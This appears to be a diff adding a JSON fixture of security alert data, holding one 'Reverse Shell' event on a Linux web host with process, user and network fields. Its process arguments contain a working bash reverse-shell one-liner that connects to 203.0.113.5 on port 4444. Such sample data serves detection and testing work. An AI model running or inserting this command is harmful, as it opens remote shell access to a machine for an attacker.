@@ -1,0 +1,14 @@
+{
+  "events": [
+    {
+      "alert": {"id": "FX-LNX-300", "level": 12, "name": "Reverse Shell", "timestamp": 1790929250000, "mitre": ["T1059.004"]},
+      "host": {"hostname": "prod-web-01", "ip": "10.0.0.10", "os": "Linux"},
+      "user": {"username": "postgres", "admin": false},
+      "process": {
+        "pid": 22100, "start_time": 1790929250000, "name": "bash",
+        "args": "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
+      },
+      "network": [{"dest_ip": "203.0.113.5", "dest_port": 4444, "protocol": "TCP"}]
+    }
+  ]
+}
